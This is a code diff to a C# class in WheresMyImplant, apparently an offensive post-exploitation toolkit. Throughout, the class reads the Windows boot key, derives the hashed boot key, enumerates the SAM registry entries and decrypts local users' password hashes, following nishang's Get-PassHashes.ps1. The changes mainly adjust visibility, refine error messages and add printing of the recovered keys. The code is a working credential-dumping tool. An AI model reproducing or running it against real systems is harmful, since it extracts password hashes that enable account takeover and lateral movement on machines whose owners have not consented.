@@ -7,6 +7,8 @@ using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
     class SAM : Base
@@ -19,10 +21,12 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public SAM()
+        internal SAM()
         {
             Byte[] bootKey = LSASecrets.GetBootKey();
+            WriteOutputGood(String.Format("BootKey: {0}", System.BitConverter.ToString(bootKey).Replace("-","")));
             Byte[] hBootKey = GetHBootKey(bootKey);
+            WriteOutputGood(String.Format("HBootKey: {0}", System.BitConverter.ToString(hBootKey).Replace("-", "")));
             UserKeys[] userKeys = GetUserHashes(hBootKey);
             DecryptUserHashes(ref userKeys, hBootKey);
         }
@@ -30,7 +34,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         // Good
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] GetHBootKey(Byte[] bootKey)
+        internal static Byte[] GetHBootKey(Byte[] bootKey)
         {
             Byte[] F = (Byte[])Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account").GetValue("F");
             //Byte[] F = (Byte[])RegRead.ReadRegKey(Unmanaged.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account", "F");
@@ -50,19 +54,19 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public struct UserKeys
+        internal struct UserKeys
         {
-            public String userName;
-            public Int32 rid;
-            public Byte[] v;
-            public Byte[] f;
-            public Byte[] userPasswordHint;
+            internal String userName;
+            internal Int32 rid;
+            internal Byte[] v;
+            internal Byte[] f;
+            internal Byte[] userPasswordHint;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public UserKeys[] GetUserHashes(Byte[] hBootKey)
+        internal UserKeys[] GetUserHashes(Byte[] hBootKey)
         {
             int size = 0;
             UIntPtr hKey = new UIntPtr();
@@ -71,15 +75,17 @@ namespace WheresMyImplant
             String[] namesSubKeys = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users\Names").GetSubKeyNames();
             foreach (String name in namesSubKeys)
             {
-                if (Advapi32.RegOpenKeyEx(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\Names\" + name, 0, Reg.KEY_QUERY_VALUE, out hKey) != 0)
+                if (advapi32.RegOpenKeyEx(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\Names\" + name, 0, Reg.KEY_QUERY_VALUE, out hKey) != 0)
                 {
-                    String error = String.Format("Error querying value '{0}\\{1}: 0x{2:x}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "", Marshal.GetLastWin32Error());
+                    String error = String.Format("Error opening key '{0}\\{1}: 0x{2:x}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                    Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                     WriteOutputBad(error);
                     return null;
                 }
-                if (Advapi32.RegQueryValueEx(hKey, "", 0, ref type, IntPtr.Zero, ref size) != 0)
+                if (advapi32.RegQueryValueEx(hKey, "", 0, ref type, IntPtr.Zero, ref size) != 0)
                 {
-                    String error = String.Format("[-] Error querying value '{0}\\{1}: 0x{2:x}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "", Marshal.GetLastWin32Error());
+                    String error = String.Format("[-] Error querying value '{0}\\{1}: 0x{2:x}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                    Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                     WriteOutputBad(error);
                     return null;
                 }
@@ -105,7 +111,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public void DecryptUserHashes(ref UserKeys[] userKeys, Byte[] hBootKey)
+        internal void DecryptUserHashes(ref UserKeys[] userKeys, Byte[] hBootKey)
         {
             foreach (UserKeys userKey in userKeys)
             {
@@ -139,7 +145,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] decryptSingleHash(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType)
+        internal static Byte[] decryptSingleHash(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType)
         {
             Int32[][] desKeys = convertRidToDesKey(rid);
             Byte[] rc4DecryptedHash;
@@ -158,7 +164,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] decryptDes(Byte[] encrytped, Int32[] key)
+        internal static Byte[] decryptDes(Byte[] encrytped, Int32[] key)
         {
             Byte[] desKey = new Byte[key.Length];
             for (Int32 i = 0; i < key.Length; i++)
@@ -183,7 +189,7 @@ namespace WheresMyImplant
         //Good
         //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        public static Int32[][] convertRidToDesKey(Int32 rid)
+        internal static Int32[][] convertRidToDesKey(Int32 rid)
         {
             Byte b0 = Convert.ToByte(rid & 255);
             Byte b1 = Convert.ToByte((rid & 65280) / 256);
@@ -200,7 +206,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        public static Int32[] convertRidToDesKey2(Byte[] key)
+        internal static Int32[] convertRidToDesKey2(Byte[] key)
         {
             Int32 k0 = (Int32)Math.Floor(key[0] * .5);
             Int32 k1 = (key[0] & 0x01) * 64 | (Int32)Math.Floor(key[1] * .25);
